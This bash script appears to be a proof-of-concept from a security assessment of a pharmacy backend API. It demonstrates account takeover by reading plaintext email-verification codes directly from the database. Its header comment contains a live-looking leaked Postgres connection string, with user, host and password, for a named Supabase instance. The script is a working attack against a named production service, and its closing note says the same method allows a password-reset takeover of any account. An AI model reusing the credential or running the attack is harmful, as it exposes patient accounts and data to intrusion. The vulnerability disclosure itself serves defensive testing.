#!/usr/bin/env bash
# =============================================================================
# CREDENTIAL DEMO: DB read -> account takeover (verification code theft)
# -----------------------------------------------------------------------------
# Proves that with database access you can fetch an account's verification
# code (stored PLAINTEXT) and complete email verification + login — without
# ever touching the victim's inbox.
#
# USAGE (parameterised; no secrets hard-coded):
#   export BASE='https://pharmacy-backend-hmir.onrender.com/api'
#   export DB_URL='postgresql://USER:PASS@HOST:5432/DB?sslmode=require'
#   ./credential-demo.sh
#
# For reference, the leaked value used during the 2026-08-11 assessment
# (DO NOT commit working credentials):
#   postgresql://postgres.lsjjjtdqnexufakpcuyr:Ubwenge%402026made@aws-1-eu-west-2.pooler.supabase.com:5432/postgres
#   (URL-decoded password = Ubwenge@2026made)
#
# SAFETY: creates a throwaway account, then DELETES it at the end.
# =============================================================================
set -euo pipefail

BASE="${BASE:-https://pharmacy-backend-hmir.onrender.com/api}"
DB_URL="${DB_URL:-}"
EMAIL="dbcred_demo_$(date +%s)@test.com"
PASSWORD="Test@1234"        # any password works; this is just the demo value

if [[ -z "$DB_URL" ]]; then
  echo "[!] Set DB_URL first, e.g."
  echo "    export DB_URL='postgresql://user:pass@host:5432/db?sslmode=require'"
  exit 1
fi

echo "==== [1] REGISTER a fresh test account via the API ===="
curl -s -m 20 -X POST "$BASE/auth/register/patient" \
  -H 'Content-Type: application/json' \
  -d "{
        \"email\": \"$EMAIL\",
        \"password\": \"$PASSWORD\",
        \"confirmPassword\": \"$PASSWORD\",
        \"firstName\": \"Cred\",
        \"lastName\": \"Demo\",
        \"phone\": \"0788999999\"
      }" | jq -c .
echo

echo "==== [2] FETCH its verification code FROM THE DATABASE (no inbox) ===="
CODE=$(psql "$DB_URL" -t -A -c \
  "SELECT \"verificationCode\" FROM users WHERE email='$EMAIL' AND \"verificationCode\" IS NOT NULL LIMIT 1;")
if [[ -z "$CODE" ]]; then
  echo "[-] No code found — the account may already be verified or the query failed."
  exit 1
fi
echo "    DB code = $CODE   (stored in PLAINTEXT)"
echo

echo "==== [3] USE the DB-fetched code to verify the email via the API ===="
curl -s -m 20 -X POST "$BASE/auth/verify-email" \
  -H 'Content-Type: application/json' \
  -d "{\"email\":\"$EMAIL\",\"code\":\"$CODE\"}" | jq -c .
echo

echo "==== [4] LOGIN with the freshly verified account ===="
curl -s -m 20 -X POST "$BASE/auth/login" \
  -H 'Content-Type: application/json' \
  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASSWORD\"}" \
  | jq -c '{user: {id: .user.id, email: .user.email, role: .user.role, isVerified: .user.isVerified}, token: (.accessToken[0:25] + "...")}'
echo

echo "==== [5] CLEANUP: remove the throwaway account (no trace) ===="
psql "$DB_URL" -c "DELETE FROM patients WHERE \"userId\"=(SELECT id FROM users WHERE email='$EMAIL');" >/dev/null 2>&1 || true
psql "$DB_URL" -c "DELETE FROM users WHERE email='$EMAIL';"
echo "    cleanup done -> account removed"
echo
echo "[+] DONE — verification code read from the DB produced a working session."
echo "    NOTE: forgot-password reuses the same plaintext column, so the same"
echo "    trick completes a full password-reset takeover for ANY account."
